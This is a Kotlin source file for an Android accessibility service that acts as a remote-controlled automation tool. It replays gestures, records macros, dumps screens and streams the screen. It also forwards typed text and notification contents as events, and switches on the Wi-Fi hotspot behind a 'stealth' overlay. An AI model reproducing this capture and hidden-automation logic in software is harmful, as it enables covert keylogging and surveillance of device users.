package com.systemlinker.features.systemacc

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Path
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class SystemAccessibility : AccessibilityService() {

    private lateinit var domEngine: DomEngine
    private lateinit var stealthOverlay: StealthOverlay
    private lateinit var liveScreen: LiveScreenManager
    private var lastForegroundPackage = ""

    private var needsAppLaunch = false
    private var needsTextInput = false
    private var needsNotification = false

    // Macro Tracking Variables
    private var isTrackingMacro = false
    private var macroStartTime = 0L
    private val macroEvents = mutableListOf<String>()

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val action = intent?.action
            val cmdAction = intent?.getStringExtra("action") ?: ""
            
            if (action == "com.systemlinker.ACC_CONFIG_UPDATE") {
                needsAppLaunch = intent?.getBooleanExtra("needs_app_launch", false) ?: false
                needsTextInput = intent?.getBooleanExtra("needs_text_input", false) ?: false
                needsNotification = intent?.getBooleanExtra("needs_notification", false) ?: false
                return
            }
            
            when (cmdAction) {
                "btn_back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                "btn_home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                "btn_recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                "stream_screen_start" -> liveScreen.isStreaming = true
                "stream_screen_stop" -> liveScreen.isStreaming = false
                "toggle_hotspot" -> stealthOverlay.triggerHotspotAutomation()
                
                "start_macro_track" -> {
                    isTrackingMacro = true
                    macroStartTime = System.currentTimeMillis()
                    macroEvents.clear()
                }
                "stop_macro_track" -> {
                    isTrackingMacro = false
                    val file = File(cacheDir, "macro_track.txt")
                    file.writeText(macroEvents.joinToString("\n"))
                    sendBroadcast(Intent("com.systemlinker.MACRO_RESULT").apply {
                        setPackage(packageName)
                        putExtra("path", file.absolutePath)
                    })
                }
                "play_macro" -> {
                    val content = intent?.getStringExtra("macro_content") ?: ""
                    val loops = intent?.getIntExtra("loops", 1) ?: 1
                    playMacro(content, loops)
                }
                
                "dump_screen_request" -> {
                    domEngine.generateDebugDump(getActiveRoots().flatMap { flattenNode(it) })
                    sendUiResult("SUCCESS: DUMP_GENERATED")
                }
                
                "workflow_ui" -> {
                    val sx = intent?.getIntExtra("ui_swipe_sx", 0)?.toFloat() ?: 0f
                    val sy = intent?.getIntExtra("ui_swipe_sy", 0)?.toFloat() ?: 0f
                    val ex = intent?.getIntExtra("ui_swipe_ex", 0)?.toFloat() ?: 0f
                    val ey = intent?.getIntExtra("ui_swipe_ey", 0)?.toFloat() ?: 0f

                    if (intent?.getStringExtra("ui_action") == "swipe" && (sx != 0f || sy != 0f)) {
                        val stroke = GestureDescription.StrokeDescription(Path().apply { moveTo(sx, sy); lineTo(ex, ey) }, 0, 500)
                        val success = dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
                        sendUiResult(if (success) "SUCCESS: Swipe dispatched." else "FAILED: Swipe failed.")
                        return
                    }
                    
                    val texts = (intent?.getStringExtra("ui_texts") ?: "").split("|").map { it.trim() }.filter { it.isNotEmpty() }
                    val targetType = intent?.getStringExtra("ui_target") ?: ""
                    val uiAction = intent?.getStringExtra("ui_action") ?: "click"
                    val offset = intent?.getIntExtra("ui_offset", 1) ?: 1
                    val caseSensitive = intent?.getBooleanExtra("ui_case_sensitive", false) ?: false
                    val inputText = intent?.getStringExtra("ui_input_text") ?: ""
                    val doExtract = intent?.getBooleanExtra("ui_extract", false) ?: false
                    
                    sendUiResult(domEngine.executeLinearDomSearch(getActiveRoots(), texts, targetType, uiAction, offset, caseSensitive, inputText, doExtract))
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or 
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED or AccessibilityEvent.TYPE_VIEW_LONG_CLICKED or AccessibilityEvent.TYPE_VIEW_SCROLLED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        
        domEngine = DomEngine(this)
        stealthOverlay = StealthOverlay(this)
        liveScreen = LiveScreenManager(this)

        val filter = IntentFilter().apply {
            addAction("com.systemlinker.ACC_ACTION")
            addAction("com.systemlinker.ACC_CONFIG_UPDATE")
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        else registerReceiver(commandReceiver, filter)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (isTrackingMacro) {
            val node = event.source
            if (node != null) {
                val time = System.currentTimeMillis() - macroStartTime
                val rect = android.graphics.Rect()
                node.getBoundsInScreen(rect)
                val cx = rect.centerX().toFloat()
                val cy = rect.centerY().toFloat()
                val details = "${node.className}|${node.text ?: node.contentDescription ?: "null"}"
                
                when (event.eventType) {
                    AccessibilityEvent.TYPE_VIEW_CLICKED -> macroEvents.add("$time|click|$cx,$cy|$details")
                    AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> macroEvents.add("$time|long_click|$cx,$cy|$details")
                    AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                        val dx = event.scrollDeltaX
                        val dy = event.scrollDeltaY
                        if (dy > 0) macroEvents.add("$time|swipe_up|$cx,$cy|$details")
                        else if (dy < 0) macroEvents.add("$time|swipe_down|$cx,$cy|$details")
                        else if (dx > 0) macroEvents.add("$time|swipe_left|$cx,$cy|$details")
                        else if (dx < 0) macroEvents.add("$time|swipe_right|$cx,$cy|$details")
                    }
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                        val text = event.text.joinToString("")
                        macroEvents.add("$time|text|$cx,$cy|$text")
                    }
                }
                node.recycle()
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: ""
                val cls = event.className?.toString() ?: ""
                if (pkg.isNotEmpty() && pkg != "com.android.settings" && pkg != "com.systemlinker") lastForegroundPackage = pkg
                
                if (needsAppLaunch) {
                    broadcastEvent("app_launch", pkg)
                    if (cls.isNotEmpty()) broadcastEvent("activity_launch", "$pkg/$cls")
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (needsTextInput && !isTrackingMacro) broadcastEvent("text_input", event.text.joinToString(" "))
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                if (needsNotification) broadcastEvent("notification", event.text.joinToString(" "))
            }
        }

        if (stealthOverlay.isAutomatingHotspot) {
            if (domEngine.executeLinearDomSearch(getActiveRoots(), listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering"), "Switch", "click", 1, false, "", false).startsWith("SUCCESS")) {
                stealthOverlay.finishHotspotAutomation(lastForegroundPackage)
            }
            return 
        }

        liveScreen.processStream(rootInActiveWindow)
    }

    private fun playMacro(content: String, loops: Int) {
        CoroutineScope(Dispatchers.Main).launch {
            for (i in 0 until loops) {
                var lastTime = 0L
                val lines = content.split("\n")
                for (line in lines) {
                    val parts = line.split("|")
                    if (parts.size < 3) continue
                    val time = parts[0].toLongOrNull() ?: continue
                    
                    val waitTime = time - lastTime
                    if (waitTime > 0) delay(waitTime)
                    lastTime = time
                    
                    val action = parts[1]
                    val coords = parts[2].split(",")
                    val cx = coords[0].toFloatOrNull() ?: continue
                    val cy = coords[1].toFloatOrNull() ?: continue
                    
                    when (action) {
                        "click" -> dispatchGesture(createClick(cx, cy), null, null)
                        "long_click" -> dispatchGesture(createLongClick(cx, cy), null, null)
                        "swipe_up" -> dispatchGesture(createSwipe(cx, cy, cx, cy - 500f), null, null)
                        "swipe_down" -> dispatchGesture(createSwipe(cx, cy, cx, cy + 500f), null, null)
                        "swipe_left" -> dispatchGesture(createSwipe(cx, cy, cx - 500f, cy), null, null)
                        "swipe_right" -> dispatchGesture(createSwipe(cx, cy, cx + 500f, cy), null, null)
                        "text" -> {
                            val textToSet = if(parts.size > 3) parts[3] else ""
                            val targetNode = findNodeAt(rootInActiveWindow, cx.toInt(), cy.toInt())
                            if (targetNode != null && targetNode.isEditable) {
                                val args = android.os.Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textToSet) }
                                targetNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                            }
                        }
                    }
                }
                if (loops > 1 && i < loops - 1) delay(1000) 
            }
        }
    }

    private fun createClick(x: Float, y: Float): GestureDescription {
        val path = Path().apply { moveTo(x, y) }
        return GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 100)).build()
    }

    private fun createLongClick(x: Float, y: Float): GestureDescription {
        val path = Path().apply { moveTo(x, y) }
        return GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 600)).build()
    }

    private fun createSwipe(sx: Float, sy: Float, ex: Float, ey: Float): GestureDescription {
        val path = Path().apply { moveTo(sx, sy); lineTo(ex, ey) }
        return GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 400)).build()
    }

    private fun findNodeAt(root: AccessibilityNodeInfo?, x: Int, y: Int): AccessibilityNodeInfo? {
        if (root == null) return null
        val rect = android.graphics.Rect()
        root.getBoundsInScreen(rect)
        if (!rect.contains(x, y)) return null
        for (i in 0 until root.childCount) {
            val child = root.getChild(i)
            val result = findNodeAt(child, x, y)
            if (result != null) return result
        }
        return root
    }

    private fun getActiveRoots(): List<AccessibilityNodeInfo> {
        val roots = mutableListOf<AccessibilityNodeInfo>()
        if (windows.isNotEmpty()) windows.forEach { it.root?.let { r -> roots.add(r) } }
        else rootInActiveWindow?.let { roots.add(it) }
        return roots
    }

    private fun flattenNode(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val list = mutableListOf<AccessibilityNodeInfo>(node)
        for (i in 0 until node.childCount) node.getChild(i)?.let { list.addAll(flattenNode(it)) }
        return list
    }

    private fun sendUiResult(msg: String) = sendBroadcast(Intent("com.systemlinker.UI_RESULT").apply { setPackage(packageName); putExtra("result", msg) })
    private fun broadcastEvent(type: String, data: String) = sendBroadcast(Intent("com.systemlinker.EVENT_TRIGGER").apply { setPackage(packageName); putExtra("event_type", type); putExtra("event_data", data) })

    override fun onInterrupt() { stealthOverlay.hide() }
    override fun onDestroy() { super.onDestroy(); stealthOverlay.hide(); unregisterReceiver(commandReceiver) }
}